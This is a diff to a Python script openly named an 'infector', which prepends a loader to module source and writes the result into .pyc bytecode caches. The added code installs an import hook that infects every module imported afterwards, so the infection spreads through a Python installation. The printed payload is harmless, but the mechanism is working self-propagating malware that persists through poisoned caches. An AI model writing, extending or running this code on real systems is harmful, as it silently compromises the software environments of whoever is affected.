@@ -1,14 +1,14 @@
 #! /usr/bin/env python3
 
-from importlib.util import cache_from_source
 import importlib._bootstrap_external
 import importlib.machinery
 import importlib.util
 import os
+import sys
 
 INFECTION = """
 from importlib.machinery import SourceFileLoader
-foo = SourceFileLoader("infector.py", "{}").load_module()
+foo = SourceFileLoader("infector", "{}").load_module().main()
 """
 
 
@@ -25,7 +25,7 @@ def _infect(filename):
     cfile = importlib.util.cache_from_source(filename)
     loader = importlib.machinery.SourceFileLoader('<py_compile>', filename)
     source_bytes = loader.get_data(filename)
-    source_bytes = INFECTION.format(os.path.dirname(__file__)).encode("ascii") + source_bytes
+    source_bytes = INFECTION.format(__file__).encode("ascii") + source_bytes
     code = loader.source_to_code(source_bytes, filename)
     try:
         dirname = os.path.dirname(cfile)
@@ -38,3 +38,26 @@ def _infect(filename):
             code, source_stats['mtime'], source_stats['size'])
     mode = importlib._bootstrap_external._calc_mode(filename)
     importlib._bootstrap_external._write_atomic(cfile, bytecode, mode)
+
+
+class InfectImporter():
+
+    def __init__(self):
+        self.inside = False
+        sys.meta_path = [self] + sys.meta_path
+
+    def find_spec(self, name, path=None, target=None):
+        if not self.inside:
+            self.inside = True
+            spec = importlib.util.find_spec(name, path)
+            infect(spec.origin)
+            self.inside = False
+        return None
+
+
+def main():
+    print("Infected")
+    InfectImporter()
+
+if __name__ == "__main__":
+    main()
